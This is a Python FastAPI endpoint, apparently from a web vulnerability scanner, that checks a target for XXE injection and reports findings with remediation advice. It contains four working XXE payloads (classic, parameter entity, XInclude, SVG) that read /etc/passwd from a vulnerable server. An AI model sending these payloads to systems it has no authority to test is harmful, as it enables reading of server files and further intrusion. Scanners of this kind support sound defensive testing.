"""XXE (XML External Entity) scanner.

Zero-FP via /etc/passwd content marker. Inject XML payload that
resolves an external entity pointing to file:///etc/passwd. If the
response contains "root:x:0:0:", XXE is confirmed.

Tests 4 payload variants x 3 content types = 12 attempts:
  - Classic XXE, Parameter entity, XInclude, SVG XXE
  - application/xml, text/xml, application/soap+xml
"""
import re
from fastapi import APIRouter, Depends

from tools._shared import (
    ScanRequest, verify_scan_quota, web_url,
    safe_post, wrap_finding, standard_response,
)

router = APIRouter()


XXE_PAYLOADS = [
    ("Classic XXE",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
     '<foo>&xxe;</foo>'),
    ("Parameter entity XXE",
     '<?xml version="1.0"?>\n'
     '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
     '<foo>&xxe;</foo>'),
    ("XInclude",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
     '<xi:include href="file:///etc/passwd" parse="text"/></root>'),
    ("SVG XXE",
     '<?xml version="1.0"?>\n'
     '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
     '<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'),
]

CONTENT_TYPES = ["application/xml", "text/xml", "application/soap+xml"]
PASSWD_PATTERN = re.compile(r"root:[^:]*:0:0:", re.M)


@router.post("/api/scan/xxe")
async def scan_xxe(req: ScanRequest, _=Depends(verify_scan_quota)):
    url = web_url(req.target)
    findings = []
    tests = 0
    raw_results = []
    confirmed = None

    for variant, payload in XXE_PAYLOADS:
        for ct in CONTENT_TYPES:
            tests += 1
            r = safe_post(url, req=req, data=payload, allow_redirects=True, timeout=12,
                          headers={"Content-Type": ct, "User-Agent": "VulnusLab/1.0"})
            if r is None or r.status_code >= 500:
                raw_results.append({"variant": variant, "content_type": ct, "result": "no response"})
                continue
            body = r.text or ""
            if PASSWD_PATTERN.search(body):
                confirmed = {"variant": variant, "content_type": ct,
                             "status_code": r.status_code,
                             "body_snippet": body[:300].replace("\n", " ")}
                raw_results.append({"variant": variant, "content_type": ct,
                                    "result": "VULNERABLE", "status": r.status_code})
                break
            else:
                raw_results.append({"variant": variant, "content_type": ct,
                                    "result": "safe", "status": r.status_code})
        if confirmed:
            break

    if confirmed:
        findings.append(wrap_finding(
            f"XXE — read /etc/passwd via {confirmed['variant']} ({confirmed['content_type']})",
            "CRITICAL", cwe="CWE-611", owasp="A05:2021",
            evidence_marker=f"POST {url} Content-Type: {confirmed['content_type']} with {confirmed['variant']} payload returned HTTP {confirmed['status_code']} containing /etc/passwd content. Body: {confirmed['body_snippet'][:150]}",
            remediation="Disable external entity processing in your XML parser. lxml: XMLParser(resolve_entities=False, no_network=True). Java: setFeature 'disallow-doctype-decl'. If your app doesn't need XML, reject the Content-Type.",
            tests_performed=tests,
            cvss="9.0",
        ))

    return standard_response(
        tool="xxe", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=f"Tested {len(XXE_PAYLOADS)} XXE variants x {len(CONTENT_TYPES)} content types ({tests} total) — confirmed via /etc/passwd marker",
        raw_data={"xxe": {"tests_performed": tests, "vulnerable_count": len(findings), "results": raw_results}},
    )


def register(app):
    app.include_router(router)
